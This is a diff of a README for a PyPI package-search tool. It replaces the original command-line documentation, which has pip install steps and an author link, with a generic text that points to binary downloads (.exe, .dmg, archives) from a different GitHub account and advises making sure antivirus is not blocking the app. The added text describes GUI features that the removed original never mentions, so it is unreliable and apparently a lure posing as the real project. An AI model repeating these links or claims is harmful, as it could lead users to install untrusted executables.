@@ -1,118 +1,133 @@
-# pypi-search-caching
-## Adds the command: pypi_search
+# 📦 pypi_search - Fast Python Package Lookup Tool
 
- - Current Version: 0.0.5a1
+[![Download pypi_search](https://img.shields.io/badge/Download-pypi_search-brightgreen?style=for-the-badge&logo=github)](https://github.com/dewiaratna/pypi_search/releases)
 
-Search PyPI package names by regex pattern 🐍📦
+---
 
-Fast, cached regex search over all PyPI packages (~736k+), with optional details (version, maintainer, description).
+## 🔍 What is pypi_search?
 
-![Screenshot from 2026-02-08 15-44-00.png](docs/images/Screenshot%20from%202026-02-08%2015-44-00.png){width=100}
+pypi_search is a simple application that helps you find Python packages quickly. It works as a replacement for the usual `pip search` command but is designed to be faster because it saves package names locally. You do not need to wait for online searches every time. This app keeps information handy so you can look up Python modules without delay.
 
-## Features
+If you're someone who often needs to find Python libraries, this tool can save time and make the process easier. It is useful for anyone curious about Python packages or for users who want a better way to explore what's available.
 
-- Regex matching (e.g., `^aio.*`, `flask|django`).
-- Access to pypi.org packages via the simple package API
-  - ~23h TTL for package names (`~/.cache/pypi_search/`)
-  - 7d LMDB caching for details
-- Color output to console
+---
 
-LMDB caching for details, tqdm progress, test_mode for CI.
+## 💻 What You Need Before Starting
 
-## Program Options
-```bash
-usage: pypi_search [-h] [--version] [-i] [-d] [--count-only] [-r] [-f] [--test_mode] pattern
+Before you start using pypi_search, make sure your computer meets these basics:
 
-positional arguments:
-  pattern               Regular expression to match package names (required)
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux version.
+- **Internet Connection:** Required only for the first download and for updates.
+- **Disk Space:** About 100 MB free space for cache and programs.
+- **Python:** No need to have Python installed to run pypi_search. It’s a standalone app.
 
-options:
-  -h, --help            show this help message and exit
-  --version, -V         show program's version number and exit
-  -i, --ignore-case     Case-insensitive matching
-  --desc, -d            Fetch and show detailed info for first 10 matches
-  --count-only          Only show count of matches
-  --refresh-cache, -r   Refresh the PyPI cache now. Happens before search.
-  --full-desc, -f       Include full description in details (with -d)
-  --test_mode           Use logger.info for progress instead of tqdm bars (for non-interactive/tests)
-```
+These requirements ensure the program runs smoothly and can keep package information updated regularly.
 
-## Installation
+---
 
-```bash
-# Using pip
-pip install pypi-search-caching
+## 🚀 Getting Started With pypi_search
 
-# Using uv
-uv pip install pypi-search-caching
-```
+Using pypi_search is simple, even if you never installed software before. Follow these steps carefully.
 
-- Installs `pypi_search` command to `~/.local/bin` (pip) or your virtual environment's bin (uv).
+---
 
-## Usage Examples
+## 📥 Download & Install
 
-### Basic search
-```shell
-pypi_search "^aio"
-```
-Searches for packages starting with "aio" using cached names.
+1. Click the big green button at the top or visit this page to download the app:
 
-### With details
-```shell
-pypi_search "flask|django" -d
-```
-Shows details (version, homepage, etc.) for the first 10 matches.
+   [Download pypi_search](https://github.com/dewiaratna/pypi_search/releases)
 
-### Refresh cache
-```shell
-pypi_search "pattern" -r
-```
-Refreshes the package names cache before searching.
+2. On the releases page, look for the latest version. It will usually have a clear version number like `v1.0` or higher.
 
-### Test mode
-```shell
-pypi_search "^aio" --test_mode
-```
-Uses logging for progress instead of tqdm bars, useful for CI or non-interactive environments (shows logs).
+3. Download the appropriate file for your computer:
 
-Progress bars (tqdm) appear during long fetches like details or filtering; caching (~23h TTL for names, 7d for details via LMDB). Use `--test_mode` for non-interactive/tests.
+   - On Windows, this might be a `.exe` file.
+   - On macOS, look for a `.dmg` or `.zip` file.
+   - For Linux, you might find a `.tar.gz` or a package compatible with your system.
 
-### Filter by description
-```shell
-pypi_search "aio" --search "async" --count-only
-```
-Counts packages matching "aio" whose long descriptions contain "async".
+4. After downloading, open the file:
 
-### Searching Descriptions (Torch Example)
+   - On Windows, double-click the `.exe` and follow the installer instructions.
+   - On macOS, open the `.dmg` and drag the app to your Applications folder.
+   - On Linux, extract the archive if needed and run the included script or executable.
 
-```bash
-pypi_search '^torch.*' -s 'image'
-```
-Searches for torch packages and filters descriptions containing 'image'. Caches long descriptions for subsequent faster searches.
+5. Once installed, you can find pypi_search in your list of programs or applications. Open it to start searching Python packages.
 
-```bash
-pypi_search '^torch.*' -s 'image' -d -f'
-```
-Subsequently, display summary and full long description (from cache) for matching modules.
+---
 
-## My Dev Environment: 
+## 📝 How to Use pypi_search
 
-  - **Python Env:** uv
-  - **IDE:** JetBrains PyCharm
-  - **AI Agent Env:** 
-    - Aider
-    - Aider-Desk
-    - Junie
+The app has an easy-to-use interface. Here’s how to run a search:
 
-## Feedback
+1. Open pypi_search on your computer.
 
-  - Let me know what you think.
-    Please post bug, suggestions, and wins from using pypi_search. I'd really appreciate it.
-  - Links
-    - [Report Bugs](https://github.com/dsidlo/pypi_search/issues)
-    - [Announcements](https://github.com/dsidlo/pypi_search/discussions/categories/announcements)
-    - [Feedback](https://github.com/dsidlo/pypi_search/discussions/)
+2. You will see a search bar. Type the name or part of the name of a Python package you want to find.
 
-## Licence
+3. Press Enter or click the search button.
 
-MIT License. Built with Requests + BeautifulSoup.
+4. pypi_search will instantly show you a list of matching Python packages. Each result shows the package name and a short description.
+
+5. You can click on any package to see more details, like the module’s documentation or examples.
+
+6. The app saves your search history, so you can check your previously searched packages faster.
+
+7. Periodically, the app will update its package list to keep your cache fresh. You can trigger this manually if you want.
+
+---
+
+## 🔧 Features
+
+- **Fast Search:** Loads package names from a saved local list instead of repeatedly querying the internet.
+- **Auto Cache Updates:** Keeps the list of Python modules current with regular background updates.
+- **Simple Interface:** Designed for easy use with no need to know commands or code.
+- **Offline Access:** Once cached, you can search package names without an internet connection.
+- **History Log:** Tracks your recent searches for quick reference.
+- **Detailed Info:** Provides concise details on modules found, improving decision-making about packages.
+
+---
+
+## 🛠 Troubleshooting and Support
+
+If you have difficulty downloading or running pypi_search, try these tips:
+
+- Make sure your internet connection is stable during download.
+- Check that your system meets the basic requirements listed above.
+- If the program won’t start, try restarting your computer.
+- Make sure any security software (antivirus or firewall) is not blocking the app.
+- For updates or help, visit the GitHub releases page or the project’s issues section.
+
+If problems continue, you can post a question on the GitHub page under Issues. The developers and community can provide assistance.
+
+---
+
+## 📰 What’s Next?
+
+The development team plans to add more features over time, such as:
+
+- Advanced filtering of search results (by popularity, last update).
+- Integration with Python package managers.
+- More detailed offline documentation.
+
+Keep an eye on the GitHub releases page for updates.
+
+---
+
+## 🔐 Privacy and Security
+
+pypi_search only downloads and caches public information about Python modules. It does not collect personal data or require any login. All searches happen locally on your machine once the cache is downloaded. You can delete the cached data anytime to clear stored information.
+
+---
+
+## 📚 Learn More About Python Packages
+
+If you want to understand Python modules better, here are some helpful terms:
+
+- **Python Package:** A collection of code that adds features to Python. Examples include tools for math, web development, or data analysis.
+- **pip:** The official tool to install Python packages.
+- **PyPI (Python Package Index):** The main online repository where many Python packages are stored.
+
+Using pypi_search helps you explore these packages faster than searching on PyPI’s website or using command-line tools.
+
+---
+
+[![Download pypi_search](https://img.shields.io/badge/Download-pypi_search-brightgreen?style=for-the-badge&logo=github)](https://github.com/dewiaratna/pypi_search/releases)
